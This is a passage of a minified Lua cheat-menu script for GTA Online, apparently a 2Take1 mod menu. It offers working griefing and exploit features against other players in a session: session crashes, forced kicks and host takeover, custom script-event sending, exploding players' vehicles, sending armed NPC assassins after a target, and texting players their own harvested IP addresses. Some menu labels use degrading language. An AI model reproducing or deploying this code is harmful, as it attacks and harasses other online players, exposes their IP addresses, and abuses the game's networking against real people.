                            f(bZ .. " has an modded SCID!\nMarking him as a Modder...", 130)
                            j(bZ .. " has an modded SCID!")
                            j("Marking him as a Modder...")
                            player.set_player_as_modder(B, av["moddedscid"])
                        end
                        for cQ = 1, #J do
                            if bi == J[cQ] then
                                f(bZ .. " has an modded SCID!\nMarking him as a Modder...", 130)
                                j(bZ .. " has an modded SCID!")
                                j("Marking him as a Modder...")
                                player.set_player_as_modder(B, av["moddedscid"])
                            end
                        end
                    end
                end
            end
            c["modded_ip_scid"] = aP.on
            return aO(aP)
        end
    )
    S["modded_ip_scid"].on = c["modded_ip_scid"]
    S["modded_net_events"] =
        aH(
        "Modded Net-Events",
        R["modder"],
        function()
            if cu == nil then
                cu = hook.register_net_event_hook(cy)
            else
                hook.remove_net_event_hook(cu)
                cu = nil
            end
            c["modded_net_events"] = S["modded_net_events"].on
        end
    )
    S["modded_net_events"].on = c["modded_net_events"]
    S["modder_force_sh"] =
        aH(
        "Forcing Script-Host",
        R["modder"],
        function(aP)
            c["modder_force_sh"] = aP.on
            if aP.on then
                if ae == nil then
                    ae = script.get_host_of_this_script()
                end
                local time = utils.time_ms() + 5000
                while time > utils.time_ms() do
                    system.wait(250)
                    c["modder_force_sh"] = aP.on
                end
                local cY = script.get_host_of_this_script()
                if not player.is_player_valid(ae) or aB(ae) == -1 then
                    ae = nil
                end
                if ae ~= nil then
                    if ae ~= cY then
                        if player.is_player_valid(ae) and player.is_player_valid(cY) then
                            if aB(ae) ~= -1 and aB(cY) ~= -1 then
                                j("Script-Host changed without previous SH leaving!")
                                j("SH changed from '" .. aA(ae) .. "' to '" .. aA(cY) .. "'.")
                                f("Script-Host changed from '" .. aA(ae) .. "' to '" .. aA(cY) .. "'.", 130)
                                player.set_player_as_modder(cY, av["force_sh"])
                                ae = cY
                            end
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    S["modder_force_sh"].on = c["modder_force_sh"]
    R["lobby"] = aD("Lobby", R["parent"])
    R["lobby"].hidden = c["lobby_hidden"]
    R["lobby"] = R["lobby"].id
    R["bl_veh"] = aD("Block Vehicles in Session", R["lobby"]).id
    S["veh_blacklist"] =
        aH(
        "Activate Block Vehicles",
        R["bl_veh"],
        function(aP)
            c["veh_blacklist"] = aP.on
            if aP.on then
                local time = utils.time_ms() + 2000
                while time > utils.time_ms() do
                    system.wait(200)
                    c["veh_blacklist"] = aP.on
                end
                for B = 0, 31 do
                    if bu(B) then
                        local bc = ped.get_vehicle_ped_is_using(aW(B))
                        if bc ~= 0 then
                            bc = entity.get_entity_model_hash(bc)
                            for br = 1, #s do
                                if S[s[br][1]].on and bc == s[br][2] then
                                    j("Detected Blacklisted Vehicle " .. s[br][1] .. " in Session!")
                                    bc = ped.get_vehicle_ped_is_using(aW(B))
                                    aQ(bc, 100)
                                    if entity.get_entity_god_mode(bc) then
                                        aQ(bc)
                                        entity.set_entity_god_mode(bc, false)
                                    end
                                    if not entity.get_entity_god_mode(bc) then
                                        j("Exploding User: " .. aA(B))
                                        f(
                                            "Detected Blacklisted Vehicle " ..
                                                s[br][1] .. " from user: " .. aA(B) .. ", exploding it!",
                                            28
                                        )
                                        entity.set_entity_velocity(bc, v3())
                                        vehicle.set_vehicle_forward_speed(bc, 0)
                                        vehicle.set_vehicle_out_of_control(bc, false, true)
                                        fire.add_explosion(aZ(aW(B)), 59, false, true, 1, aW(B))
                                    end
                                end
                            end
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    S["veh_blacklist"].on = c["veh_blacklist"]
    for B = 1, #s do
        S[s[B][1]] =
            aH(
            "Block: " .. s[B][1],
            R["bl_veh"],
            function(aP)
                c[s[B][1]] = aP.on
            end
        )
        S[s[B][1]].on = c[s[B][1]]
    end
    R["bl_area"] = aD("Block Areas", R["lobby"]).id
    S["teleport_to_block"] =
        aH(
        "Teleport to Block",
        R["bl_area"],
        function(aP)
            c["teleport_to_block"] = aP.on
        end
    )
    S["teleport_to_block"].on = c["teleport_to_block"]
    aG(
        "Clear blocking Objects",
        R["bl_area"],
        function()
            b1(Q["bl_objects"])
            Q["bl_objects"] = {}
        end
    )
    R["bl_area_lsc"] = aD("Block LSCs", R["bl_area"]).id
    for B = 1, #x do
        aG(
            x[B][1],
            R["bl_area_lsc"],
            function()
                cc(x[B][2])
            end
        )
    end
    R["bl_area_casino"] = aD("Block Casino", R["bl_area"]).id
    for B = 1, #y do
        aG(
            y[B][1],
            R["bl_area_casino"],
            function()
                cc(y[B][2])
            end
        )
    end
    R["bl_area_mazebank"] = aD("Block Maze Bank", R["bl_area"]).id
    for B = 1, #z do
        aG(
            z[B][1],
            R["bl_area_mazebank"],
            function()
                cc(z[B][2])
            end
        )
    end
    R["bl_area_custom"] = aD("Custom Areas", R["bl_area"]).id
    for B = 1, #E do
        aG(
            E[B][1],
            R["bl_area_custom"],
            function()
                cc(E[B][2])
            end
        )
    end
    R["explode"] = aD("Explosion-Features", R["lobby"]).id
    S["laser_beam_explode_waypoint"] =
        aG(
        "Laser Beam Explode Waypoint",
        R["explode"],
        function()
            local cZ = ui.get_waypoint_coord()
            if cZ.x ~= 16000 then
                local c_ = aZ(aX()).z + 175
                for B = c_, -50, -2 do
                    local bb = v3(cZ.x, cZ.y, B)
                    bb.x = math.floor(bb.x)
                    bb.y = math.floor(bb.y)
                    fire.add_explosion(bb, 59, true, false, 0, 0)
                    for br = 1, 2 do
                        bb.x = math.random(bb.x - 3, bb.x + 3)
                        bb.y = math.random(bb.y - 3, bb.y + 3)
                        fire.add_explosion(bb, 59, true, false, 0, 0)
                    end
                    bb.x = math.random(bb.x - 6, bb.x + 6)
                    bb.y = math.random(bb.y - 6, bb.y + 6)
                    fire.add_explosion(bb, 8, true, false, 0, 0)
                    system.wait(0)
                end
            else
                f("No Waypoint found, set a waypoint first!")
            end
        end
    )
    S["explode_lobby"] =
        aI(
        "Random Explosions",
        "value_i",
        R["explode"],
        function(aP)
            if aP.on then
                local bb = v3()
                for B = 1, 5 do
                    bb.x = math.random(-2700, 2700)
                    bb.y = math.random(-3300, 7500)
                    bb.z = math.random(30, 90)
                    fire.add_explosion(bb, S["explode_lobby"].value_i, true, false, 0, 0)
                end
            end
            c["explode_lobby_value"] = S["explode_lobby"].value_i
            c["explode_lobby"] = aP.on
            return aO(aP)
        end
    )
    S["explode_lobby"].max_i = 74
    S["explode_lobby"].min_i = 0
    S["explode_lobby"].value_i = c["explode_lobby_value"]
    S["explode_lobby"].on = c["explode_lobby"]
    S["explode_lobby_shake"] =
        aH(
        "Shake Cam",
        R["explode"],
        function(aP)
            if aP.on then
                local bb = v3()
                for B = 1, 10 do
                    bb.x = math.random(-2700, 2700)
                    bb.y = math.random(-3300, 7500)
                    bb.z = math.random(30, 90)
                    fire.add_explosion(bb, 8, false, true, 20, 0)
                end
            end
            c["explode_lobby_shake"] = aP.on
            return aO(aP)
        end
    )
    S["explode_lobby_shake"].on = c["explode_lobby_shake"]
    R["sound"] = aD("Sound-Features", R["lobby"]).id
    S["sound_rape"] =
        aH(
        "Sound Rape",
        R["sound"],
        function(aP)
            if aP.on then
                for B = 0, 31 do
                    if bu(B) then
                        audio.play_sound_from_entity(2, "Wasted", aW(B), "DLC_IE_VV_General_Sounds")
                    end
                end
            end
            c["sound_rape"] = aP.on
            return aO(aP)
        end
    )
    S["sound_rape"].on = c["sound_rape"]
    aG(
        "Garage-Door Sound - Infinite Time",
        R["sound"],
        function()
            for B = 0, 31 do
                if bu(B) then
                    audio.play_sound_from_entity(2, "Garage_Door", aW(B), "DLC_HEISTS_GENERIC_SOUNDS")
                end
            end
        end
    )
    S["kill_all_peds"] =
        aH(
        "Kill all PEDs",
        R["lobby"],
        function(aP)
            if aP.on then
                local d0 = ped.get_all_peds()
                for B = 1, #d0 do
                    if not ped.is_ped_a_player(d0[B]) then
                        ped.set_ped_health(d0[B], 0)
                    end
                end
            end
            c["kill_all_peds"] = aP.on
            return aO(aP)
        end
    )
    S["kill_all_peds"].on = c["kill_all_peds"]
    S["disablecontrol"] =
        aH(
        "Disable Control from near Vehicles",
        R["lobby"],
        function(aP)
            if aP.on then
                for B = 0, 31 do
                    if bu(B) then
                        local bc = ped.get_vehicle_ped_is_using(aW(B))
                        if bc ~= 0 then
                            aQ(bc)
                            vehicle.set_vehicle_forward_speed(bc, 25)
                            vehicle.set_vehicle_out_of_control(bc, false, true)
                        end
                    end
                end
            end
            c["disablecontrol"] = aP.on
            return aO(aP)
        end
    )
    S["disablecontrol"].on = c["disablecontrol"]
    R["lobby_bounty"] = aD("Bounty", R["lobby"]).id
    S["bounty_after_death"] =
        aI(
        "Set Bounty after Death",
        "value_i",
        R["lobby_bounty"],
        function(aP)
            c["bounty_after_death"] = aP.on
            c["bounty_after_death_value"] = aP.value_i
            if aP.on then
                local d1 = 0
                if S["anonymous_bounty"].on then
                    d1 = 1
                end
                for B = 0, 31 do
                    if bu(B) then
                        if player.get_player_health(B) == 0 then
                            f(aA(B) .. " is dead!\nSetting bounty...", 33)
                            j(aA(B) .. " is dead!")
                            j("Setting bounty...")
                            for cU = 0, 31 do
                                if aB(cU) ~= -1 then
                                    aU(
                                        544453591,
                                        cU,
                                        {
                                            69,
                                            B,
                                            1,
                                            S["bounty_after_death"].value_i,
                                            0,
                                            d1,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            script.get_global_i(1650640 + 9),
                                            script.get_global_i(1650640 + 10)
                                        }
                                    )
                                end
                            end
                            system.wait(1500)
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    S["bounty_after_death"].on = c["bounty_after_death"]
    S["bounty_after_death"].min_i = 0
    S["bounty_after_death"].max_i = 10000
    S["bounty_after_death"].value_i = c["bounty_after_death_value"]
    S["anonymous_bounty"] =
        aH(
        "Anonymous Bounty",
        R["lobby_bounty"],
        function(aP)
            c["anonymous_bounty"] = aP.on
        end
    )
    S["anonymous_bounty"].on = c["anonymous_bounty"]
    for B = 1, #L do
        aG(
            L[B] .. "$",
            R["lobby_bounty"],
            function()
                local d1 = 0
                if S["anonymous_bounty"].on then
                    d1 = 1
                end
                for cU = 0, 31 do
                    if aB(cU) ~= -1 then
                        for d2 = 0, 31 do
                            if aB(d2) ~= -1 then
                                aU(
                                    544453591,
                                    d2,
                                    {
                                        69,
                                        cU,
                                        1,
                                        L[B],
                                        0,
                                        d1,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        script.get_global_i(1650640 + 9),
                                        script.get_global_i(1650640 + 10)
                                    }
                                )
                            end
                        end
                    end
                end
            end
        )
    end
    R["lobby_se"] = aD("Script Events", R["lobby"]).id
    R["lobby_se_custom"] = aD("Custom Script Events", R["lobby_se"]).id
    aG(
        "Enter Custom Script Event with Parameters",
        R["lobby_se_custom"],
        function()
            local aR, d3, d4
            local d5 = {}
            aR, d3 = input.get("Enter Custom SE (DEC)", "", 32, 3)
            while aR == 1 do
                system.wait(0)
                aR, d3 = input.get("Enter Custom SE (DEC)", "", 32, 3)
            end
            if aR == 2 then
                f("Aborted sending Custom Event...", 100)
                return HANDLER_POP
            end
            while d4 ~= "#" do
                aR, d4 = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                while aR == 1 do
                    system.wait(0)
                    aR, d4 = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                end
                if aR == 2 then
                    f("Aborted sending Custom Event...", 100)
                    return HANDLER_POP
                end
                if d4 == "#" then
                    break
                end
                d4 = tonumber(d4)
                if type(d4) == "number" then
                    d5[#d5 + 1] = d4
                else
                    f("Aborted sending Custom Event...", 100)
                    return HANDLER_POP
                end
            end
            for B = 0, 31 do
                if bu(B) then
                    aU(d3, B, d5)
                end
            end
            f("Sent Custom Script Event with Parameters to Players.", 100)
        end
    )
    for B = 1, #D do
        aG(
            D[B][1],
            R["lobby_se_custom"],
            function()
                f("Sent Custom Script Event to Players.", 100)
                for cH = 0, 31 do
                    if bu(cH) then
                        for br = 1, #D[B][2] do
                            aU(D[B][2][br][1], cH, D[B][2][br][2])
                        end
                    end
                end
            end
        )
    end
    R["lobby_send_2_mission"] = aD("Send all to Mission", R["lobby_se"]).id
    for B = 1, #n do
        aG(
            "Send to " .. n[B][1],
            R["lobby_send_2_mission"],
            function()
                cd(true, 0x692CC4BB, n[B][2])
                f("Sent Session to Mission")
            end
        )
    end
    R["lobby_ceo"] = aD("CEO all Player", R["lobby_se"]).id
    for B = 1, 3 do
        aG(
            o[B][1],
            R["lobby_ceo"],
            function()
                cd(true, o[B][2], o[B][3], o[B][4], o[B][5])
                f("Modified Players CEO")
            end
        )
    end
    aG(
        "Block - Passive",
        R["lobby_se"],
        function()
            cd(true, 0x54BAD868, {1, 1})
            f("Blocked all Players from activating Passive.")
        end
    )
    aG(
        "UN-Block - Passive",
        R["lobby_se"],
        function()
            cd(true, 0x54BAD868, {2, 0})
            f("UN-Blocked all Players from Passive.")
        end
    )
    R["lobby_sms"] =
        aD(
        "Send SMSs to Lobby",
        R["lobby"],
        function()
            f("Players must have Voice-Chat enabled to recive SMS.")
        end
    ).id
    aG(
        "Custom SMS input",
        R["lobby_sms"],
        function()
            local aR, d6 = input.get("Enter Custom SMS", "", 128, 0)
            while aR == 1 do
                system.wait(0)
                aR, d6 = input.get("Enter Custom SMS", "", 128, 0)
            end
            if aR == 2 then
                return HANDLER_POP
            end
            for B = 0, 31 do
                if bu(B) then
                    player.send_player_sms(B, d6)
                end
            end
        end
    )
    aG(
        "Send SCID & IP",
        R["lobby_sms"],
        function()
            for B = 0, 31 do
                if bu(B) then
                    local bi = tostring(aB(B))
                    local cI = player.get_player_ip(B)
                    cI = string.format("%i.%i.%i.%i", cI >> 24 & 0xff, cI >> 16 & 0xff, cI >> 8 & 0xff, cI & 0xff)
                    player.send_player_sms(B, "R*SCID: " .. bi .. "~n~IP: " .. cI)
                end
            end
        end
    )
    for B = 1, #M do
        aG(
            M[B],
            R["lobby_sms"],
            function()
                for cU = 0, 31 do
                    if bu(cU) then
                        player.send_player_sms(cU, M[B])
                    end
                end
            end
        )
    end
    R["lobby_malicious"] = aD("Malicious", R["lobby"]).id
    S["karma_se"] =
        aH(
        "Karma every Script Event",
        R["lobby_malicious"],
        function(aP)
            if cs == nil then
                cs = hook.register_script_event_hook(cr)
            else
                hook.remove_script_event_hook(cs)
            end
            c["karma_se"] = aP.on
        end
    )
    S["karma_se"].on = c["karma_se"]
    S["punish_aliens"] =
        aH(
        "Punish Aliens in Lobby",
        R["lobby_malicious"],
        function(aP)
            c["punish_aliens"] = aP.on
            if aP.on then
                local time = utils.time_ms() + 15000
                while time > utils.time_ms() do
                    c["punish_aliens"] = aP.on
                    system.yield(150)
                end
                for B = 0, 31 do
                    if bu(B) then
                        local cA = 0
                        if player.is_player_female(B) then
                            if
                                ped.get_ped_drawable_variation(aW(B), 1) == 134 and
                                    (ped.get_ped_texture_variation(aW(B), 1) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 1) == 9)
                             then
                                cA = cA + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(B), 4) == 113 and
                                    (ped.get_ped_texture_variation(aW(B), 4) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 4) == 9)
                             then
                                cA = cA + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(B), 6) == 87 and
                                    (ped.get_ped_texture_variation(aW(B), 6) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 6) == 9)
                             then
                                cA = cA + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(B), 11) == 287 and
                                    (ped.get_ped_texture_variation(aW(B), 11) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 11) == 9)
                             then
                                cA = cA + 1
                            end
                        else
                            if
                                ped.get_ped_drawable_variation(aW(B), 1) == 134 and
                                    (ped.get_ped_texture_variation(aW(B), 1) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 1) == 9)
                             then
                                cA = cA + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(B), 4) == 106 and
                                    (ped.get_ped_texture_variation(aW(B), 4) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 4) == 9)
                             then
                                cA = cA + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(B), 6) == 83 and
                                    (ped.get_ped_texture_variation(aW(B), 6) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 6) == 9)
                             then
                                cA = cA + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(B), 11) == 274 and
                                    (ped.get_ped_texture_variation(aW(B), 11) == 8 or
                                        ped.get_ped_texture_variation(aW(B), 11) == 9)
                             then
                                cA = cA + 1
                            end
                        end
                        if cA > 1 then
                            j(aA(B) .. " is a useless alien!")
                            j("Guilty Level: " .. cA)
                            f(aA(B) .. " is a useless alien! Punishing him!", 23)
                            player.send_player_sms(B, "Delete your stupid alien Outfit!")
                            bC(F[5][2], B)
                            bC(F[8][2], B)
                            fire.add_explosion(aZ(aW(B)), 59, false, true, 1, aW(B))
                            fire.add_explosion(aZ(aW(B)), 8, true, false, 1, aW(B))
                            fire.add_explosion(aZ(aW(B)), 60, true, false, 1, aW(B))
                            fire.add_explosion(aZ(aW(B)), 8, true, false, 1, aW(B))
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    S["punish_aliens"].on = c["punish_aliens"]
    aG(
        "Kick all Players",
        R["lobby_malicious"],
        function()
            bv(true)
        end
    )
    aG(
        "Host Kick All",
        R["lobby_malicious"],
        function()
            if network.network_is_host() then
                for B = 0, 31 do
                    if bu(B) then
                        network.network_session_kick_player(B)
                    end
                end
            else
                f("You are not Session-Host!")
            end
        end
    )
    S["force_host"] =
        aH(
        "Kick Hosts until You become Host",
        R["lobby_malicious"],
        function(aP)
            if aP.on then
                local time = utils.time_ms() + 7500
                while time > utils.time_ms() do
                    system.yield(250)
                    c["force_host"] = aP.on
                end
                local d7 = player.get_host()
                if d7 ~= aV() and aB(d7) ~= -1 then
                    j("You are not Host!")
                    j(aA(d7) .. ":" .. aB(d7) .. " is Host!")
                    f(aA(d7) .. " is Host!")
                    bv(false, d7)
                end
            end
            c["force_host"] = aP.on
            return aO(aP)
        end
    )
    S["force_host"].on = c["force_host"]
    aG(
        "Crash Session",
        R["lobby_malicious"],
        function()
            j("Crashing Session...")
            menu.set_menu_can_navigate(false)
            a4 = entity.get_entity_model_hash(aX())
            for B = 1, 11 do
                a5[B] = ped.get_ped_texture_variation(aX(), B)
            end
            for B = 1, 11 do
                a6[B] = ped.get_ped_drawable_variation(aX(), B)
            end
            bl(0x471BE4B2, nil, nil, nil, true)
            a7 = true
            system.yield(5000)
            ci()
            menu.set_menu_can_navigate(true)
            j("Done.")
        end
    )
    aG("Fix loading screen after Crash", R["lobby_malicious"], ci)
    if c["2t1s_p"] then
        R["opl_parent"] = aK("2Take1Script", 0).id
    end
    aM(
        "Remote Control Vehicle",
        R["opl_parent"],
        function(aP, d8)
            local d9 = menu.get_player_feature(aP.id)
            if aP.on then
                if ag ~= d8 then
                    ag = d8
                    for B = 1, #d9.feats do
                        if B - 1 ~= d8 and d9.feats[B].on then
                            d9.feats[B].on = false
                        end
                    end
                end
                local bc = ped.get_vehicle_ped_is_using(aW(d8))
                if bc ~= 0 then
                    if af == nil then
                        local ca = entity.get_entity_model_hash(bc)
                        af = vehicle.create_vehicle(ca, a_(), 0, true, false)
                        ped.set_ped_into_vehicle(aX(), af, -1)
                        system.wait(50)
                    end
                    entity.set_entity_visible(af, false)
                    if entity.get_entity_attached_to(bc) ~= af then
                        aQ(af)
                        entity.set_entity_velocity(af, v3())
                        b0(af, aZ(bc))
                        system.wait(0)
                        entity.set_entity_rotation(af, entity.get_entity_rotation(bc))
                        aQ(bc)
                        entity.set_entity_velocity(bc, v3())
                        entity.set_entity_max_speed(bc, 0)
                        vehicle.set_vehicle_out_of_control(bc, false, false)
                        entity.attach_entity_to_entity(bc, af, 0, v3(), v3(), true, false, false, 0, true)
                    end
                    return HANDLER_CONTINUE
                else
                    for B = 1, #d9.feats do
                        if d9.feats[B].on then
                            d9.feats[B].on = false
                        end
                    end
                    f("Target is not in a Vehicle!")
                    return HANDLER_POP
                end
            end
            if af ~= nil then
                ped.clear_ped_tasks_immediately(aX())
                b1({af})
                af = nil
            end
            return HANDLER_POP
        end
    )
    aL(
        "Repair Vehicle",
        R["opl_parent"],
        function(aP, d8)
            local bc = ped.get_vehicle_ped_is_using(aW(d8))
            if bc ~= 0 then
                aQ(bc)
                vehicle.set_vehicle_fixed(bc)
                vehicle.set_vehicle_deformation_fixed(bc)
                vehicle.set_vehicle_can_be_visibly_damaged(bc, false)
                j("Repaired Vehicle.")
            end
        end
    )
    aM(
        "Waypoint Player",
        R["opl_parent"],
        function(aP, d8)
            local d9 = menu.get_player_feature(aP.id)
            if aP.on then
                if ao ~= d8 then
                    ao = d8
                    for B = 1, #d9.feats do
                        if B - 1 ~= d8 and d9.feats[B].on then
                            d9.feats[B].on = false
                        end
                    end
                end
                local bb = aZ(aW(d8))
                ui.set_new_waypoint(v2(bb.x, bb.y))
                system.wait(500)
                return HANDLER_CONTINUE
            end
            system.wait(10)
            ui.set_waypoint_off()
            system.wait(10)
            return HANDLER_POP
        end
    )
    aL(
        "Modify Speed (0-500)",
        R["opl_parent"],
        function(aP, d8)
            local bc = ped.get_vehicle_ped_is_using(aW(d8))
            if bc ~= 0 then
                local aR, cX = input.get("Enter modified Speed (0-500)", "", 10, 3)
                while aR == 1 do
                    system.wait(0)
                    aR, cX = input.get("Enter modified Speed (0-500)", "", 10, 3)
                end
                if aR == 2 then
                    return HANDLER_POP
                end
                cX = tonumber(cX)
                if cX < 0 or cX > 500 then
                    f("Invalid Speed.")
                    return HANDLER_POP
                end
                f("Setting modified Speed.")
                aQ(bc)
                entity.set_entity_max_speed(bc, cX)
                vehicle.modify_vehicle_top_speed(bc, cX)
            end
        end
    )
    R["attach"] = aK("Attach Objects", R["opl_parent"]).id
    aL(
        "Attach Entity from Aim",
        R["attach"],
        function(aP, id)
            local da = player.get_entity_player_is_aiming_at(aV())
            if da ~= 0 then
                bC({{da, 0, {0, 0, 0}, {0, 0, 0}}}, id, true)
            else
                f("No Entity found. Aim @Entity to attach it to Player.")
            end
        end
    )
    aL(
        "Clear Entitys",
        R["attach"],
        function()
            j("Clearing Attachments.")
            b1(Q["attach_obj"])
            Q["attach_obj"] = {}
            f("Cleared all Attachment Entitys.")
        end
    )
    aL("---------------------------------------", R["attach"])
    for B = 1, #F do
        aL(
            F[B][1],
            R["attach"],
            function(aP, id)
                bC(F[B][2], id)
            end
        )
    end
    R["opl_se"] = aK("Script-Events", R["opl_parent"]).id
    R["opl_se_custom"] = aK("Custom Script Events", R["opl_se"]).id
    aL(
        "Enter Custom Script Event with Parameters",
        R["opl_se_custom"],
        function(aP, id)
            local aR, d3, d4
            local d5 = {}
            aR, d3 = input.get("Enter Custom SE (DEC)", "", 32, 3)
            while aR == 1 do
                system.wait(0)
                aR, d3 = input.get("Enter Custom SE (DEC)", "", 32, 3)
            end
            if aR == 2 then
                f("Aborted sending Custom Event...", 93)
                return HANDLER_POP
            end
            while d4 ~= "#" do
                aR, d4 = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                while aR == 1 do
                    system.wait(0)
                    aR, d4 = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                end
                if aR == 2 then
                    f("Aborted sending Custom Event...", 93)
                    return HANDLER_POP
                end
                if d4 == "#" then
                    break
                end
                d4 = tonumber(d4)
                if type(d4) == "number" then
                    d5[#d5 + 1] = d4
                else
                    f("Aborted sending Custom Event...", 93)
                    return HANDLER_POP
                end
            end
            aU(d3, id, d5)
            f("Sent Custom Script Event with Parameters to Player.", 93)
        end
    )
    for B = 1, #D do
        aL(
            D[B][1],
            R["opl_se_custom"],
            function(aP, id)
                f("Sent Custom Script Event to Player.", 93)
                for br = 1, #D[B][2] do
                    aU(D[B][2][br][1], id, D[B][2][br][2])
                end
            end
        )
    end
    aL(
        "Block - Passive",
        R["opl_se"],
        function(aP, id)
            cd(false, 0x54BAD868, {1, 1}, nil, nil, id)
            f("Blocked Player from activating Passive.")
        end
    )
    aL(
        "UN-Block - Passive",
        R["opl_se"],
        function(aP, id)
            cd(false, 0x54BAD868, {2, 0}, nil, nil, id)
            f("UN-Blocked Player from Passive.")
        end
    )
    R["opl_send_2_mission"] = aK("Send Player to Mission", R["opl_se"]).id
    for B = 1, #n do
        aL(
            "Send to " .. n[B][1],
            R["opl_send_2_mission"],
            function(aP, id)
                cd(false, 0x692CC4BB, n[B][2], nil, nil, id)
                f("Sent Player to Mission")
            end
        )
    end
    R["opl_ceo"] = aK("CEO", R["opl_se"]).id
    for B = 1, 3 do
        aL(
            o[B][1],
            R["opl_ceo"],
            function(aP, id)
                cd(false, o[B][2], o[B][3], o[B][4], o[B][5], id)
                f("Modified Players CEO")
            end
        )
    end
    R["opl_assassins_peds"] = aK("Send PEDs (Assassins)", R["opl_parent"]).id
    aL(
        "Clear PEDs",
        R["opl_assassins_peds"],
        function()
            b1(Q["peds"])
            Q["peds"] = {}
        end
    )
    for B = 1, #r do
        aL(
            "Spawn " .. r[B][1] .. " (3x)",
            R["opl_assassins_peds"],
            function(aP, id)
                j("Spawning PEDs.")
                ah = id
                local ca = r[B][2]
                local db = r[B][3]
                local bb = v3()
                aS(ca)
                for B = 1, 3 do
                    bb = aZ(aW(id))
                    bb.x = bb.x + math.random(-10, 10)
                    bb.y = bb.y + math.random(-10, 10)
                    Q["peds"][#Q["peds"] + 1] = ped.create_ped(db, ca, bb, 0.0, true, false)
                    if db ~= 28 then
                        weapon.give_delayed_weapon_to_ped(Q["peds"][#Q["peds"]], 0xDBBD7280, 0, 0)
                    end
                    ped.set_ped_max_health(Q["peds"][#Q["peds"]], 25000000.0)
                    ped.set_ped_health(Q["peds"][#Q["peds"]], 25000000.0)
                    ped.set_ped_combat_attributes(Q["peds"][#Q["peds"]], 46, true)
                    ped.set_ped_combat_ability(Q["peds"][#Q["peds"]], 2)
                    ped.set_ped_config_flag(Q["peds"][#Q["peds"]], 187, 0)
                    ped.set_ped_can_ragdoll(Q["peds"][#Q["peds"]], false)
                    for cU = 1, 26 do
                        ped.set_ped_ragdoll_blocking_flags(Q["peds"][#Q["peds"]], cU)
                    end
                    ai.task_combat_ped(Q["peds"][#Q["peds"]], aW(id), 0, 16)
                end
                aT(ca)
                j("Done.")
            end
        )
    end
    aL(
        "TP to Player",
        R["opl_parent"],
        function(aP, id)
            b8(aZ(aW(id)), 3)
        end
    )
    aL(
        "TP Players Vehicle to me",
        R["opl_parent"],
        function(aP, id)
            local bc = ped.get_vehicle_ped_is_using(aW(id))
            aQ(bc)
            entity.set_entity_velocity(bc, v3())
            b0(bc, a_())
        end
    )
    aM(
        "Unmark Modder",
        R["opl_parent"],
        function(aP, id)
            if aP.on then
                if player.is_player_modder(id, -1) then
                    player.unset_player_as_modder(id, -1)
                end
            end
            return aO(aP)
        end
    )
    aL(
        "Add Player to Blacklist",
        R["opl_parent"],
        function(aP, id)
            local bi = aB(id)
            if bi == aB(aV()) or bi == -1 then
                f("Choose valid Player.")
            else
                local A = io.open(a .. "\\2Take1Blacklist.cfg", "a")
                io.output(A)
                io.write(bi .. " " .. aA(id) .. "\n")
                io.close(A)
                f("Player " .. aA(id) .. " added to Blocklist.", 48)
                j("Player " .. aA(id) .. " with SCID: " .. bi .. " added to Blacklist.")
            end
        end
    )
    R["opl_misc"] = aK("Miscellaneous", R["opl_parent"]).id
    R["opl_sms"] =
        aK(
        "Send SMSs to Player",
        R["opl_misc"],
        function()
            f("Player must have Voice-Chat enabled to recive SMS.")
        end
    ).id
    aL(
        "Custom SMS input",
        R["opl_sms"],
        function(aP, id)
            local aR, d6 = input.get("Enter Custom SMS", "", 128, 0)
            while aR == 1 do
                system.yield(0)
                aR, d6 = input.get("Enter Custom SMS", "", 128, 0)
            end
            if aR == 2 then
                return HANDLER_POP
            end
            player.send_player_sms(id, d6)
        end
    )
    aL(
        "Send his SCID & IP",
        R["opl_sms"],
        function(aP, id)
            local bi = tostring(aB(id))
            local cI = player.get_player_ip(id)
            cI = string.format("%i.%i.%i.%i", cI >> 24 & 0xff, cI >> 16 & 0xff, cI >> 8 & 0xff, cI & 0xff)
            player.send_player_sms(id, "R*SCID: " .. bi .. "~n~IP: " .. cI)
        end
    )
    for B = 1, #M do
        aL(
            M[B],
            R["opl_sms"],
            function(aP, id)
                player.send_player_sms(id, M[B])
            end
        )
    end
    aL(
        "Falling Asteroids",
        R["opl_misc"],
        function(aP, id)
            menu.set_menu_can_navigate(false)
            local bb = v3()
            local dc
            aS(3751297495)
            for B = 1, 25 do
                bb = aZ(aW(id))
                bb.x = math.random(math.floor(bb.x - 80), math.floor(bb.x + 80))
                bb.y = math.random(math.floor(bb.y - 80), math.floor(bb.y + 80))
                bb.z = bb.z + math.random(45, 90)
                dc = math.random(-125, 25)
                Q["asteroids"][#Q["asteroids"] + 1] = object.create_object(3751297495, bb, true, true)
                entity.apply_force_to_entity(Q["asteroids"][#Q["asteroids"]], 3, 0, 0, dc, 0, 0, 0, true, true)
            end
            aT(3751297495)
            for B = 1, 5 do
                for B = 1, 25 do
                    bb = aZ(Q["asteroids"][#Q["asteroids"] - 25 + B])
                    fire.add_explosion(bb, 8, true, false, 0, 0)
                    system.yield(50)
                end
            end
            menu.set_menu_can_navigate(true)
        end
    )
    aL(
        "Delete Asteroids",
        R["opl_misc"],
        function()
            j("Clearing Asteroids.")
            b1(Q["asteroids"])
